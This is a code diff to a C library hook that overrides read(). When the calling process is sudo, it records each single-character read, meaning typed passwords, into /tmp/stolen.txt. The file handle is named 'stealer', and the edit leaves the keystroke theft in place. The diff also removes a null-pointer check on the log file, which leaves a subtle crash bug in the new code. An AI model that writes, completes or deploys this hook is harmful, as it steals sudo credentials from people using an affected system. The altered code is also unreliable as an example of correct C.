@@ -35,7 +35,7 @@ long long getfsize(const char* fn) {
         return -1;
     }
     off_t fs = st.st_size;
-    //printf("size: %ld", (long long)fs);
+    //printf("size: %lld", (long long)fs);
     return (long long)fs;
 
 }
@@ -59,19 +59,18 @@ ssize_t read(int fd, void *buf, size_t count) {
         fgets(process_name, sizeof(process_name), fp_comm);
         process_name[strcspn(process_name, "\n")] = '\0';
         if (strcmp(process_name, "sudo") == 0) {
-
-            long long fsz = getfsize("/tmp/stolen.txt");
-            if (fsz < 0 || fsz >= MAX_FILE_SIZE) {
+          //  long long fsz = getfsize("/tmp/stolen.txt");
+            if (getfsize("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
               fclose(fp_comm);
                 return original_read(fd, buf, count);
             }
             FILE *stealer = fopen("/tmp/stolen.txt", "a");
-            if (stealer) {
+            // this helps us isolate the characters from term only
                 if (count == 1) {
+                  // we need to cast buf
                     fprintf(stealer, "%.1s", (char*)buf);
                 }
                 fclose(stealer);
-            }
         }
         fclose(fp_comm);
     } else {
